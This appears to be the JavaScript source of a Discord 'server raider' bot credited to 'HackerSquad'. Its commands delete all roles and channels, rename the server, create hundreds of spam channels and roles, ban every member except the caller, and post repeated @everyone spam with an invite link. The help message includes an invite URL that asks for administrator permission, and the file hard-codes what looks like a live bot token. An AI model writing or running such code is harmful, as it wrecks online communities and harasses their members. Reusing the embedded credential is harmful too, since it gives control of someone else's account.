const Discord = require("discord.js");
const client = new Discord.Client();
const promp = require("prompt-sync");

const presence = prompt("Bot Game : ");
const servername = prompt("Type the server name : ");

client.on("ready", ready => {
  console.log(`Server Ripper iniciado por : ${client.user.tag} By HackerSquad ( Renegade )`);
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: presence,
    }
  }).then(() => console.log(`Presencia cargada a el Bot : ${client.user.tag}`));
});

client.on("message", async message => {
  if(message.content === "$auto") {
    await message.guild.roles.cache.forEach(r => r.delete());
    await message.guild.channels.cache.forEach(c => c.delete());
    await message.guild.setName(servername);
    for(let i = 0; i <= 500; i++) {
     message.guild.channels.create("RαιԃҽԃBყHαƈƙҽɾSϙυαԃ");
    }
  }

  if(message.content === "$down") {
    let role = await message.guild.roles.create({
      data: {
        name: "Dwned",
        hoist: true,
        color: "BLACK",
      }
    });
    message.guild.members.cache.forEach(m => {
      if(m.id !== message.author.id) {
        m.roles.add(role);
        console.log(`Rol Down Agregado a ${m.user.tag}`);
      }
    });
  }

  if(message.content === "$ban") {
    message.guild.members.cache.forEach(m => {
    if(m.id !== message.author.id) {
        m.ban();
        console.log(`El usuario ${m.user.tag} fue baneado`);
    }
  })
  }

  if(message.content === "$lag") {
    for(let i = 0; i <= 250; i++) {
      message.guild.roles.create({ data: { name: "Hker$hit", color: "BLACK"} });
      message.guild.setName("HkerShit");
      message.guild.setName("HackerSquad - Attack");
    }
  }
  
  if(message.content === "$help") {
    const embed = new Discord.MessageEmbed()
    .setTitle("Cookies Commands")
    .setDescription("HackerSquad No Oficial Rbot\n[Invitame a tu servidor](https://discord.com/api/oauth2/authorize?client_id=886622778176974858&permissions=8&scope=bot)")
    .addFields(
      { name: "`$auto`", value: "Raidea el servidor", inline: false },
      { name: "`$down`", value: "Crea un rol de Down y se lo pone a todo el mundo", inline: false },
      { name: "`$ban`", value: "Banea a todo el mundo menos a el ejecutor de el mensaje", inline: false },
      { name: "`$lag`", value: "Lagea el servidor ( Crea roles etc.. )", inline: false },
      { name: "`$help`", value: "Manda este mensaje", inline: false }
    )
    .setColor("BLACK");
    message.channel.send(embed)
  }
});

client.on("channelCreate", channel => {
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
});


client.login("ODg2NjIyNzc4MTc2OTc0ODU4.YT4Rzg.YjxuFS998K31vXJbpUniGwn6EWw")

// 
